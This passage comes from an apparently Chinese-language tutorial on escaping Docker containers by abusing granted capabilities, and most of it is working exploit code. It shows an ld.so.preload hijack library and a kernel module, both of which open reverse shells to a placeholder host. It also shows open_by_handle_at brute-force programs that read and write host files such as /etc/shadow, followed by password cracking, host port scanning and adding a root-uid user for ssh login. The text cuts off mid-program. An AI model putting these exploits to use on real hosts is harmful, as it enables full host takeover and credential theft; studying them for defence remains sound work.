<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">int tcp_port = 8080;</span><br><span class="line">char *ip = &quot;ip&quot;;</span><br><span class="line">__attribute__((destructor)) void test()&#123;</span><br><span class="line">	remove(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">	int pid;</span><br><span class="line">	if((pid=fork())==0)&#123;</span><br><span class="line">        int fd;</span><br><span class="line">        struct sockaddr_in addr;</span><br><span class="line">        addr.sin_family = AF_INET;</span><br><span class="line">        addr.sin_port = htons(tcp_port);</span><br><span class="line">        addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line">        fd = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">        connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr));</span><br><span class="line">        dup2(fd, 0);</span><br><span class="line">        dup2(fd, 1);</span><br><span class="line">        dup2(fd, 2);</span><br><span class="line">        system(&quot;/bin/bash&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc evil.c --shared -fPIC -o evil.so</span><br></pre></td></tr></table></figure>
<p>上传evil.so到&#x2F;tmp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;/tmp/evil.so&#x27; &gt;/etc/ld.so.preload</span><br></pre></td></tr></table></figure>
<p>不过这种ld劫持还是需要类似有运维操作才可以触发，或者说有新进程创建</p>
<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>当我们完成文件系统层面逃逸后，可以做端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz -w2  172.17.0.1 1-65535 2&gt;&amp;1|grep succeeded</span><br></pre></td></tr></table></figure>
<p>如果发现宿主机开放了ssh服务，那我们可以直接ssh登陆到宿主机上实现完整的逃逸<br>直接adduser</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser test</span><br></pre></td></tr></table></figure>
<p>同时可以修改&#x2F;etc&#x2F;passwd 把test uid改为0变成root,然后ssh登陆即可</p>
<h2 id="CAP-SYS-MODULE"><a href="#CAP-SYS-MODULE" class="headerlink" title="CAP_SYS_MODULE"></a><strong>CAP_SYS_MODULE</strong></h2><h3 id="实验环境配置-1"><a href="#实验环境配置-1" class="headerlink" title="实验环境配置"></a>实验环境配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --cap-add=SYS_MODULE  ubuntu:18.04</span><br></pre></td></tr></table></figure>
<h3 id="实际利用-1"><a href="#实际利用-1" class="headerlink" title="实际利用"></a>实际利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status|grep Cap</span><br></pre></td></tr></table></figure>
<p>发现有CAP_SYS_MODULE权限，那么直接往内核注入模块,我们直接在容器里面安装必备的东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update&amp;&amp;apt install -y gcc make  vim  linux-headers-$(uname -r) kmod</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;linux/module.h&gt;</span><br><span class="line">MODULE_LICENSE(&quot;GPL&quot;);</span><br><span class="line">char *argv[] = &#123;</span><br><span class="line">    &quot;/bin/bash&quot;,</span><br><span class="line">    &quot;-c&quot;,    </span><br><span class="line">    &quot;bash -i &gt;&amp;/dev/tcp/ip/8888 0&gt;&amp;1&quot;,</span><br><span class="line">    NULL    </span><br><span class="line">&#125;;</span><br><span class="line">static int __init connect_back_init(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    return call_usermodehelper(</span><br><span class="line">        argv[0],     </span><br><span class="line">        argv,        </span><br><span class="line">        NULL,        </span><br><span class="line">        UMH_WAIT_EXEC // don&#x27;t wait for program return status</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit connect_back_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(connect_back_init);</span><br><span class="line">module_exit(connect_back_exit);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj-m += exp.o</span><br><span class="line">all:</span><br><span class="line">	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules</span><br><span class="line">clean:</span><br><span class="line">	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insmod exp.ko //就会反弹shell</span><br><span class="line">rmmod exp.ko //不需要了可以及时卸载</span><br></pre></td></tr></table></figure>
<h2 id="CAP-DAC-READ-SEARCH-CAP-DAC-OVERRIDE"><a href="#CAP-DAC-READ-SEARCH-CAP-DAC-OVERRIDE" class="headerlink" title="CAP_DAC_READ_SEARCH,CAP_DAC_OVERRIDE"></a>CAP_DAC_READ_SEARCH,CAP_DAC_OVERRIDE</h2><h3 id="实验环境配置-2"><a href="#实验环境配置-2" class="headerlink" title="实验环境配置"></a>实验环境配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --cap-add=DAC_READ_SEARCH  ubuntu:18.04</span><br></pre></td></tr></table></figure>
<p>给了CAP_DAC_READ_SEARCH自动也会赋予CAP_DAC_OVERRIDE权限<br>但是如果只给CAP_DAC_OVERRIDE是不会给CAP_DAC_READ_SEARCH权限<br>只给CAP_DAC_OVERRIDE无法做到往宿主机写文件</p>
<h3 id="实际利用-2"><a href="#实际利用-2" class="headerlink" title="实际利用"></a>实际利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status|grep CapEff</span><br></pre></td></tr></table></figure>
<p>发现有CAP_DAC_READ_SEARCH和CAP_DAC_OVERRIDE权限，代表我们可以任意读写主机上的文件</p>
<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>由于docker会默认mount &#x2F;etc&#x2F;hostname ,&#x2F;etc&#x2F;resolv.conf,&#x2F;etc&#x2F;hosts<br>于是我们拿&#x2F;etc&#x2F;hostname当作open_by_handle_at的入口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dirent.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct my_file_handle &#123;</span><br><span class="line">	unsigned int handle_bytes;</span><br><span class="line">	int handle_type;</span><br><span class="line">	unsigned char f_handle[8];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void die(const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr,&quot;%s&quot;,msg);</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void dump_handle(const struct my_file_handle *h)</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr,&quot;[*] #=%d, %d, char nh[] = &#123;&quot;, h-&gt;handle_bytes,</span><br><span class="line">	        h-&gt;handle_type);</span><br><span class="line">	for (int i = 0; i &lt; h-&gt;handle_bytes; ++i) &#123;</span><br><span class="line">		fprintf(stderr,&quot;0x%02x&quot;, h-&gt;f_handle[i]);</span><br><span class="line">		if ((i + 1) % 20 == 0)</span><br><span class="line">			fprintf(stderr,&quot;\n&quot;);</span><br><span class="line">		if (i &lt; h-&gt;handle_bytes - 1)</span><br><span class="line">			fprintf(stderr,&quot;, &quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	fprintf(stderr,&quot;&#125;;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)</span><br><span class="line">&#123;</span><br><span class="line">	int fd;</span><br><span class="line">	uint32_t ino = 0;</span><br><span class="line">	struct my_file_handle outh = &#123;</span><br><span class="line">		.handle_bytes = 8,</span><br><span class="line">		.handle_type = 1</span><br><span class="line">	&#125;;</span><br><span class="line">	DIR *dir = NULL;</span><br><span class="line">	struct dirent *de = NULL;</span><br><span class="line"></span><br><span class="line">	path = strchr(path, &#x27;/&#x27;);</span><br><span class="line"></span><br><span class="line">	// recursion stops if path has been resolved</span><br><span class="line">	if (!path) &#123;</span><br><span class="line">		memcpy(oh-&gt;f_handle, ih-&gt;f_handle, sizeof(oh-&gt;f_handle));</span><br><span class="line">		oh-&gt;handle_type = 1;</span><br><span class="line">		oh-&gt;handle_bytes = 8;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	++path;</span><br><span class="line">	fprintf(stderr, &quot;[*] Resolving &#x27;%s&#x27;\n&quot;, path);</span><br><span class="line"></span><br><span class="line">	if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) &lt; 0)</span><br><span class="line">		die(&quot;[-] open_by_handle_at&quot;);</span><br><span class="line"></span><br><span class="line">	if ((dir = fdopendir(fd)) == NULL)</span><br><span class="line">		die(&quot;[-] fdopendir&quot;);</span><br><span class="line"></span><br><span class="line">	for (;;) &#123;</span><br><span class="line">		de = readdir(dir);</span><br><span class="line">		if (!de)</span><br><span class="line">			break;</span><br><span class="line">		fprintf(stderr, &quot;[*] Found %s\n&quot;, de-&gt;d_name);</span><br><span class="line">		if (strncmp(de-&gt;d_name, path, strlen(de-&gt;d_name)) == 0) &#123;</span><br><span class="line">			fprintf(stderr, &quot;[+] Match: %s ino=%d\n&quot;, de-&gt;d_name, (int)de-&gt;d_ino);</span><br><span class="line">			ino = de-&gt;d_ino;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;[*] Brute forcing remaining 32bit. This can take a while...\n&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if (de) &#123;</span><br><span class="line">		for (uint32_t i = 0; i &lt; 0xffffffff; ++i) &#123;</span><br><span class="line">			outh.handle_bytes = 8;</span><br><span class="line">			outh.handle_type = 1;</span><br><span class="line">			memcpy(outh.f_handle, &amp;ino, sizeof(ino));</span><br><span class="line">			memcpy(outh.f_handle + 4, &amp;i, sizeof(i));</span><br><span class="line"></span><br><span class="line">			if ((i % (1&lt;&lt;20)) == 0)</span><br><span class="line">				fprintf(stderr, &quot;[*] (%s) Trying: 0x%08x\n&quot;, de-&gt;d_name, i);</span><br><span class="line">			if (open_by_handle_at(bfd, (struct file_handle *)&amp;outh, 0) &gt; 0) &#123;</span><br><span class="line">				closedir(dir);</span><br><span class="line">				close(fd);</span><br><span class="line">				dump_handle(&amp;outh);</span><br><span class="line">				return find_handle(bfd, path, &amp;outh, oh);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	closedir(dir);</span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    if(argc!=3)&#123;</span><br><span class="line">        die(&quot;Usages ./read filename save_filename&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    // get a FS reference from something mounted in from outside</span><br><span class="line">	int fd1;</span><br><span class="line">    if ((fd1 = open(&quot;/etc/hostname&quot;, O_RDONLY)) &lt; 0)</span><br><span class="line">		die(&quot;[-] open outside file error&quot;);</span><br><span class="line"></span><br><span class="line">    struct my_file_handle h;</span><br><span class="line">	struct my_file_handle root_h = &#123;</span><br><span class="line">		.handle_bytes = 8,</span><br><span class="line">		.handle_type = 1,</span><br><span class="line">		.f_handle = &#123;0x02, 0, 0, 0, 0, 0, 0, 0&#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">    if (find_handle(fd1, argv[1], &amp;root_h, &amp;h) &lt;= 0)</span><br><span class="line">		die(&quot;[-] Cannot find valid handle!&quot;);</span><br><span class="line">    </span><br><span class="line">    dump_handle(&amp;h);</span><br><span class="line">    int fd2;</span><br><span class="line"></span><br><span class="line">	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&amp;h, O_RDONLY)) &lt; 0)</span><br><span class="line">		die(&quot;[-] open_by_handle&quot;);</span><br><span class="line"></span><br><span class="line">    char buf[0x1000];</span><br><span class="line">	memset(buf, 0, sizeof(buf));</span><br><span class="line">	if (read(fd2, buf, sizeof(buf) - 1) &lt; 0)</span><br><span class="line">		die(&quot;[-] read&quot;);</span><br><span class="line">    FILE *p;</span><br><span class="line">    if((p = fopen(argv[2], &quot;w&quot;))==NULL)&#123;</span><br><span class="line">        die(&quot;open write file failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        fputs(buf, p);</span><br><span class="line">        fclose(p);</span><br><span class="line">    &#125;</span><br><span class="line">	close(fd2); </span><br><span class="line">    close(fd1);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./read  /etc/shadow shadow</span><br></pre></td></tr></table></figure>
<p>会把宿主机的&#x2F;etc&#x2F;shadow读出来，保存在shadow文件里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./read /etc/ssh/sshd_config sshd_config</span><br></pre></td></tr></table></figure>
<p>查看是否可以root登陆，是否可以使用密码登陆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat sshd_config|grep PermitRootLogin</span><br><span class="line">cat sshd_config|grep PasswordAuthentication</span><br></pre></td></tr></table></figure>
<p>然后把shadow里面的密码用john进行爆破，保存格式如下图，加不加用户名都可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:password</span><br><span class="line">password</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john passwd --wordlist=password.txt</span><br></pre></td></tr></table></figure>
<p>爆破出密码了扫描ssh端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz -w2  172.17.0.1 1-65535 2&gt;&amp;1|grep succeeded</span><br></pre></td></tr></table></figure>
<p>然后ssh登陆就好</p>
<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dirent.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct my_file_handle &#123;</span><br><span class="line">  unsigned int handle_bytes;</span><br><span class="line">  int handle_type;</span><br><span class="line">  unsigned char f_handle[8];</span><br><span class="line">&#125;;</span><br><span class="line">void die(const char * msg) &#123;</span><br><span class="line">  fprintf(stderr,&quot;%s&quot;,msg);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">void dump_handle(const struct my_file_handle * h) &#123;</span><br><span class="line">  fprintf(stderr, &quot;[*] #=%d, %d, char nh[] = &#123;&quot;, h -&gt; handle_bytes,</span><br><span class="line">    h -&gt; handle_type);</span><br><span class="line">  for (int i = 0; i &lt; h -&gt; handle_bytes; ++i) &#123;</span><br><span class="line">    fprintf(stderr, &quot;0x%02x&quot;, h -&gt; f_handle[i]);</span><br><span class="line">    if ((i + 1) % 20 == 0)</span><br><span class="line">      fprintf(stderr, &quot;\n&quot;);</span><br><span class="line">    if (i &lt; h -&gt; handle_bytes - 1)</span><br><span class="line">      fprintf(stderr, &quot;, &quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  fprintf(stderr, &quot;&#125;;\n&quot;);</span><br><span class="line">&#125; </span><br><span class="line">int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)</span><br><span class="line">&#123;</span><br><span class="line">  int fd;</span><br><span class="line">  uint32_t ino = 0;</span><br><span class="line">  struct my_file_handle outh = &#123;</span><br><span class="line">    .handle_bytes = 8,</span><br><span class="line">    .handle_type = 1</span><br><span class="line">  &#125;;</span><br><span class="line">  DIR * dir = NULL;</span><br><span class="line">  struct dirent * de = NULL;</span><br><span class="line">  path = strchr(path, &#x27;/&#x27;);</span><br><span class="line">  // recursion stops if path has been resolved</span><br><span class="line">  if (!path) &#123;</span><br><span class="line">    memcpy(oh -&gt; f_handle, ih -&gt; f_handle, sizeof(oh -&gt; f_handle));</span><br><span class="line">    oh -&gt; handle_type = 1;</span><br><span class="line">    oh -&gt; handle_bytes = 8;</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  ++path;</span><br><span class="line">  fprintf(stderr, &quot;[*] Resolving &#x27;%s&#x27;\n&quot;, path);</span><br><span class="line">  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) &lt; 0)</span><br><span class="line">    die(&quot;[-] open_by_handle_at&quot;);</span><br><span class="line">  if ((dir = fdopendir(fd)) == NULL)</span><br><span class="line">    die(&quot;[-] fdopendir&quot;);</span><br><span class="line">  for (;;) &#123;</span><br><span class="line">    de = readdir(dir);</span><br><span class="line">    if (!de)</span><br><span class="line">      break;</span><br><span class="line">    fprintf(stderr, &quot;[*] Found %s\n&quot;, de -&gt; d_name);</span><br><span class="line">    if (strncmp(de -&gt; d_name, path, strlen(de -&gt; d_name)) == 0) &#123;</span><br><span class="line">      fprintf(stderr, &quot;[+] Match: %s ino=%d\n&quot;, de -&gt; d_name, (int) de -&gt; d_ino);</span><br><span class="line">      ino = de -&gt; d_ino;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fprintf(stderr, &quot;[*] Brute forcing remaining 32bit. This can take a while...\n&quot;);</span><br><span class="line">  if (de) &#123;</span><br><span class="line">    for (uint32_t i = 0; i &lt; 0xffffffff; ++i) &#123;</span><br><span class="line">      outh.handle_bytes = 8;</span><br><span class="line">      outh.handle_type = 1;</span><br><span class="line">      memcpy(outh.f_handle, &amp; ino, sizeof(ino));</span><br><span class="line">      memcpy(outh.f_handle + 4, &amp; i, sizeof(i));</span><br><span class="line">      if ((i % (1 &lt;&lt; 20)) == 0)</span><br><span class="line">        fprintf(stderr, &quot;[*] (%s) Trying: 0x%08x\n&quot;, de -&gt; d_name, i);</span><br><span class="line">      if (open_by_handle_at(bfd, (struct file_handle * ) &amp; outh, 0) &gt; 0) &#123;</span><br><span class="line">        closedir(dir);</span><br><span class="line">        close(fd);</span><br><span class="line">        dump_handle( &amp; outh);</span><br><span class="line">        return find_handle(bfd, path, &amp; outh, oh);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  closedir(dir);</span><br><span class="line">  close(fd);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char * argv[]) &#123;</span><br><span class="line">    if (argc!=3)&#123;</span><br><span class="line">        die(&quot;Usage:./write outside_file inside_file&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    int fd1;</span><br><span class="line">    // get a FS reference from something mounted in from outside</span><br><span class="line">    if ((fd1 = open(&quot;/etc/hostname&quot;, O_RDONLY)) &lt; 0)</span><br><span class="line">    die(&quot;[-] open&quot;);</span><br><span class="line">  struct my_file_handle h;</span><br><span class="line">  struct my_file_handle root_h = &#123;</span><br><span class="line">    .handle_bytes = 8,</span><br><span class="line">    .handle_type = 1,</span><br><span class="line">    .f_handle = &#123;</span><br><span class="line">      0x02,</span><br><span class="line">      0,</span><br><span class="line">      0,</span><br><span class="line">      0,</span><br><span class="line">      0,</span><br><span class="line">      0,</span><br><span class="line">      0,</span><br><span class="line">      0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  if (find_handle(fd1, argv[1], &amp; root_h, &amp; h) &lt;= 0)</span><br><span class="line">    die(&quot;[-] Cannot find valid handle!&quot;);</span><br><span class="line"></span><br><span class="line">  dump_handle( &amp; h);</span><br><span class="line">    int fd2;</span><br><span class="line">  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) &amp; h, 